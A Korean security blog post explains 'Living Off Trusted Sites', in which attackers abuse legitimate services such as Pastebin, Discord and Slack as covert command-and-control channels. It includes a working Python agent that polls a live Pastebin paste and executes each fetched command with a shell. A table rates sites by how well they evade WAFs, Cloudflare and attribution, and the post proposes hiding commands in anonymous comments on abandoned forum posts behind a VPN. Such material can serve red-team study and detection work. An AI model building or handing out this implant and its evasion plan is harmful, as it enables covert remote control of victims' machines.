---
title: "[Malware] Living Off Trusted Sites (LOTS)란?"
date: 2025-07-23 22:06:00 +09:00
categories: [hacking]
tags: [malware, LOTS]
pin: true
---

## LOTS란 무엇인가?

![Living Off Trusted Sites (LOTS)](https://www.레드팀.com/~gitbook/image?url=https%3A%2F%2F1805673931-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FtMFEdQUk1veqYea72hvC%252Fuploads%252Fgit-blob-3637574dbe5114314988b7a59285f2641f5c8563%252Flots.drawio.png%3Falt%3Dmedia&width=768&dpr=1&quality=100&sign=3d429419&sv=2)

> https://www.xn--hy1b43d247a.com/initial-access/living-off-trusted-sites

### 1. LOTS 정의와 개념

**LOTS (Living Off Trusted Sites)** 는
**공격자가 신뢰할 수 있는 웹사이트나 서비스의 `합법적인 기능`을 악용**하여 악성 명령 전달, 데이터 수집·유출, 페이로드 배포 등을 수행하는 `공격 전술`이다.

예시로 `Pastebin`, `Discord`, `Google Docs`, `DC Inside`, `notion` 등의 사이트를 이용하는 방법이 있다.

### 2. LOTS와 LOTL(Living Off The Land) 관계

* **LOTL**: 시스템 내 존재하는 **정상 도구(ex: PowerShell, 윈도우 API 등)** 를 이용해 악성 동작을 수행하는 기법, 말 그대로 땅(피해자)에게 있는 도구를 사용하는 방법.

* **LOTS**: `신뢰받는 사이트`라는 **외부 웹·클라우드 서비스**를 활용해 **명령 전달, 유출, 배포 등의 웹 기반 공격 경로**를 이용하는 방법.

## LOTS의 주요 특징

1. 신뢰된 도메인을 통한 통신 우회
    - Google, Slack, GitHub 등 이미 허용된 사이트의 도메인을 사용하므로,
네트워크 보안 장비(WAF, IDS/IPS, EDR 등)에서 의심 없이 통과될 가능성이 높음.

2. 정상 트래픽과의 구분이 어려움
    - Google Docs 문서 읽기, Discord 메시지 전송, GitHub 파일 다운로드 등은 일상적인 업무 행위와 매우 유사하여, **행위 기반 탐지(Behavioral Detection)** 에서도 탐지가 어려움. 뭐.. 회사에서 디스코드 안쓰는데 갑자기 쓰면 그건 걸리겠지만.

3. 추가적인 서버를 구현하거나 할 필요 없음
   - 쉽게 말해 비용이 안든다 이말이지, 공격자가 자체적인 서버나 도메인을 운영하지 않고도 **Pastebin**등을 이용하면 이걸 **C2**로 사용할 수도 있다는 것!

## LOTS vs C2

LOTS에 관해 찾아보다가 그럼 LOTS랑 C2의 차이점이 뭐인거지? 싶은 마음에 좀 더 찾아봤다.

### 1. 두 개념의 차이와 관계

| 항목 | C2 (Command & Control) | LOTS (Living Off Trusted Sites) |
| ------ | --------------------------------------- | --------------------------------------- |
| 개념 | 공격자가 악성코드를 원격으로 제어하기 위한 **통신 인프라 및 구조** | 신뢰된 사이트를 활용하여 **C2 기능을 수행하는 공격 전술(기법)** |
| 구성 요소  | 서버, 도메인, 프로토콜, 암호화 등| 외부 서비스(API, 게시글, 파일공유 등), 정규 트래픽|
| 탐지 가능성 | 독자적인 서버·도메인으로 인해 **도메인/IP 기반 탐지 가능** | 정상 서비스와 유사하여 **탐지 회피가 용이함** |
| 우회 능력  | 제한적 (서버/IP가 차단되면 중단됨)| 화이트리스트 우회, 보안 정책 우회 가능 |

> C2는 **무엇을 한다(통신 인프라)** 이고, LOTS는 **어떻게 하느냐(전술 또는 전략)**.
> 
> LOTS는 C2의 한 구현 방식이자, C2 인프라를 감추기 위한 **우회 전술**.

### 2. LOTS가 C2를 "대체"하는 방식

전통적인 C2 구조는 공격자가 직접 운영하는 서버(예를들어 `해커.com`)와 악성코드 간의 통신으로 구성되지만 이 방식은 다음과 같은 단점이 있다:

* **서버·도메인이 탐지/차단될 수 있음**
* **SOC(Security Operation Center)에서 트래픽을 쉽게 식별 가능**
* **보안 솔루션에 의해 정적 블랙리스트 등록**

이에 비해 LOTS는 다음과 같은 방식으로 C2를 대체하거나 보완할 수 있습니다:

| 기존 C2              | LOTS 활용 시                           |
| ------------------ | ----------------------------------- |
| 명령은 C2 서버에서 전달     | Pastebin/GDocs/Slack에서 명령 읽기        |
| 공격 결과는 C2에 보고      | Discord Webhook, Google Form 등으로 보고 |
| C2 서버 IP/도메인 노출 위험 | 신뢰된 HTTPS 도메인으로 은폐됨                 |

`신뢰된 HTTPS 도메인으로 은폐됨`이라는 의미는 원래 작업하듯이 slack에 접속한 기록이 남는 것이니 은폐되었다는 의미.

대체라는 단어 선택이 맞는지 고민해봐야겠다.

### 3. LOTS를 이용한 C2 예시

#### Pastebin 기반 C2

```
A[악성코드] --> B[Pastebin에서 명령 가져오기]
A --> C[명령 실행]
C --> D[결과 Slack Webhook으로 전송]
```

* 명령 전달: 공격자가 Pastebin에 텍스트 형태의 명령을 작성
* 명령 실행: 클라이언트는 일정 주기로 명령을 가져와 실행
* 결과 보고: Slack Webhook을 통해 공격자에게 결과 전달

이거 결과를 Slack 말고 Pastebin으로 넘길 수 있나 해보려 했는데 음... 바~로 컴퓨터인지 확인하는 `cloud flare` 뜬다.

## LOTS에 사용할 수 있을 사이트들 모음집

[Living Off Trusted Sites (LOTS) Project](https://lots-project.com/)에 들어가보면 태그별로 어떤 사이트가 어떻게 활용될 수 있을지 정리하여 나와있다.

근데 디시인사이드나 아카라이브, 코네 등의 한국 심연 사이트들은 나와있지 않다.

https://lots-project.com/site/796f75747562652e636f6d

![유튜브](https://github.com/user-attachments/assets/3838ccd0-0537-40fe-a154-7d9e1524687a)

와 심지어 유튜브도 가능하네?

## 코드 예시 (python, pastebin 예시)

**Pastebin**은 개발자들이 텍스트나 코드를 임시로 공유할 수 있도록 만든 웹 기반 서비스이지만 이 단순한 기능이 공격자에게는 C2 기능을 대체할 수 있는 강력한 수단이 되기도 한다.

| 특징 | 설명 |
| ------------------- | -------------------------------------------------------------- |
| **비회원 작성 가능** | 계정 없이도 Paste를 생성할 수 있어 **익명성이 높음** |
|  **자동 만료 기능 지원** | 일정 시간이 지나면 자동으로 삭제되도록 설정 가능 (심지어 한번 읽으면 자폭하는 `Burn after read` 기능도 제공) |
| **공용 접근 가능** | 인터넷 상 누구나 Paste를 조회할 수 있어 **클라이언트 측에서 인증 없이도 접근 가능** |

간단히 구현해본 예시

```python
import requests
import subprocess
import time

import os
print("[*] 현재 작업 디렉토리:", os.getcwd())

# Pastebin에서 명령어를 가져오는 함수
def fetch_command_from_pastebin(paste_key):
    url = f"https://pastebin.com/raw/{paste_key}"  # raw 형식으로 가져오기
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            command = response.text.strip()
            print(f"[+] 명령어 수신: {command}")
            return command
        else:
            print("[!] Pastebin 응답 오류")
            return None
    except Exception as e:
        print(f"[!] Pastebin 접속 실패: {e}")
        return None

# 명령어를 실행하고 결과를 반환하는 함수
def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, text=True)
        print(f"[+] 명령어 실행 결과: {result.strip()}")
        return result.strip()
    except subprocess.CalledProcessError as e:
        return f"[!] 실행 오류: {e}"

# 실행 결과를 파일에 저장하거나 다른 방식으로 처리 가능
def save_result(result):
    try:
        with open("result.txt", "a", encoding="utf-8") as f:
            f.write(result + "\n" + ("="*40) + "\n")
        print("[+] 결과 저장 완료")
    except Exception as e:
        print(f"[!] 결과 저장 실패: {e}")

# LOTS Agent 메인 루프
def lots_agent_loop(paste_key):
    print("[*] LOTS Agent 시작")
    seen_command = None
    while True:
        cmd = fetch_command_from_pastebin(paste_key)
        if cmd and cmd != seen_command:
            result = execute_command(cmd)
            save_result(result)
            seen_command = cmd  # 중복 실행 방지
        time.sleep(30)  # 30초마다 명령 체크

# Pastebin Paste 키 (raw URL 기준)
PASTEBIN_KEY = "JWX63SrU"  # ← 실제 pastebin 주소, 테스트를 위해 whoami를 넣어뒀고 1년 뒤 삭제될 예정이다.

# 실행
lots_agent_loop(PASTEBIN_KEY)
```

실제로 실행시켜보면

![실행](https://github.com/user-attachments/assets/e45d4a70-6fe8-40ca-9cdb-4931e098fd74)

이런 식으로 결과가 나온다는 것을 알 수 있다. 만 말이지.. 이렇게 하면 명령어를 한번 만 받을 수 있게 되기에 다른 방법을 좀 더 찾아보는 것도 좋겠다는 생각이 든다. 특히 생각하기론 [레드팀 플레이북](https://www.xn--hy1b43d247a.com/initial-access/living-off-trusted-sites)에 나온 것 처럼 디시 인사이드와 같이 댓글을 비회원으로 달 수 있는 곳, 게다가 옛날 글 중 이미 회원 탈퇴한 사람의 글에 댓글을 달고 `LOTS`에서는 그 글을 계속 주시하고 있다가 명령어가 들어오면 딱 읽어서 실행하는 식으로 하면 좋을 것 같다.

근데 디시를 안 써봐서 잘 모르겠는데 봇이 접속하면 막는 방안이 되어있다면 고건 또 우회하면 되는 것이니 좋은 방법이라고 생각된다.

뭐... 누군가 갑자기 거기에 댓글을 달면 그건 어쩔 수 없는 일이겠지만, 과연 누가 5년전 글에 갑자기 와서 댓글을 달까? 싶기도 하고..

## 코드 예시 (python, 디시 인사이트 예시)

요건 좀 더 생각을 해보기도 해야겠고, 문제가 될듯 싶어 올리지 않는다. 그리고 솔직히 할려면 누구나 할 수 있을테니 말이다. 아니 근데 다른 사이트들은 다 비회원 댓글달기가 막혀있는데 여긴 가능하네? 되게 신기한 사이트다.

## LOTS에 적합한 사이트 조건

| 평가 기준 | 설명 |
| ---------------- | ----------------------------------------- |
| **자동화 용이성** | API or 단순 HTML 구조로 자동 요청이 쉬운가? (봇 작성 가능성) |
| **계정 여부** | 비회원 작성·열람이 가능한가? |
| **보안 우회성** | 웹방화벽(WAF), Cloudflare 등 탐지를 피하기 쉬운가? |
| **악용 시 리스크** | 공격자 추적 가능성 (IP, 계정 등 남는가?) |
| **명령/응답 전달 용이성** | 텍스트 전송, 수신이 간편한가? (Webhook, raw URL 등) |

## LOTS 활용 가능 서비스 정리표

| 사이트 | 자동화 용이성 | 계정 필요 여부 | 보안 우회성 (탐지/Cloudflare) | 악용 시 리스크 | LOTS 적합성  | 비고 |
| --------------------- | ------- | ------------------ | --------------------------- | ---------------- | --------- | ----------------- |
| **Pastebin** | ✅ 매우 쉬움 | ❌ 일부 기능만 무계정 사용 가능 | ✅ 보안 우회 가능 | ⚠️ Raw URL 기록 남음 | 🔵 매우 적합  | 단방향 명령 전달용 |
| **Discord (Webhook)** | ✅ 매우 쉬움 | ❌ Webhook만 있으면 가능 | ⚠️ 탐지 가능 (Rate Limit, 봇 보안) | ⚠️ IP 추적 가능 | 🟠 부분 적합  | 결과 전달에는 적합 |
| **Slack (Webhook)** | ✅ 쉬움 | ❌ Webhook 있으면 가능   | ⚠️ API Rate Limit 있음 | ⚠️ 기업 로깅 존재 | 🟠 부분 적합  | 내부망 침투 시 사용됨 |
| **Google Sheets** | ⚠️ 중간   | ✅ 필요함 | ❌ Cloudflare + 로그인 필요 | ⚠️ Google 로깅 | 🔴 부적합 | 자동화 어려움 |
| **DC Inside** | ✅ 쉬움 | ✅ 선택적 (비회원 가능) | ✅ 클라우드플레어 없음 | ✅ 로그 적음(ip 남긴 하는데 vpn쓰면 되니까 뭐..) | 🟢 매우 적합 | **댓글 기반 LOTS** 가능 |
| **아카라이브** | ❌ 어려움 | ✅ 필요함 | ❌ Cloudflare 우회 어려움 | ✅ 로그 적음 | 🔴 부적합 | 자동화 불가 수준 |
| **코네 (koner.kr)** | ❌ 어려움 | ✅ 필요함 | ❌ Cloudflare 보호 | ✅ 로그 적음 | 🔴 부적합 | 자동 요청 막힘 |
| **Tistory/Notion** | ⚠️ 중간 | ✅ 필요함 | ⚠️ 봇 탐지 존재 (쿠키 확인 등) | ⚠️ 사용자 추적 가능 | 🟡 조건부 가능 | 로그인 필요 |
| **Telegram Bot** | ✅ 매우 쉬움 | ✅ 필요 | ✅ 보안 우회 가능 | ⚠️ 봇 등록 필요 | 🟢 적합 | 쌍방향 통신에 유용 |

일단 내가 조사해 보았을 때에는 이정도 찾아보았고, 여기서 생각해 본 것이 만약 디시인사이드를 사용하게 되면 완전 옛날 글을 찾아가고 사용자가 탈퇴한 글을 찾아 댓글을 달면 더 숨을 수 있겠다고 생각한다. 일단은 레드팀 입장에서 생각해보자면 말이다. 게다가 만약에 글이 삭제되었다고 하면 백업을 위해 추가적인 글들을 코드에 하드코딩하여 적어놓으면 더 좋은 방법일 것이라 생각한다.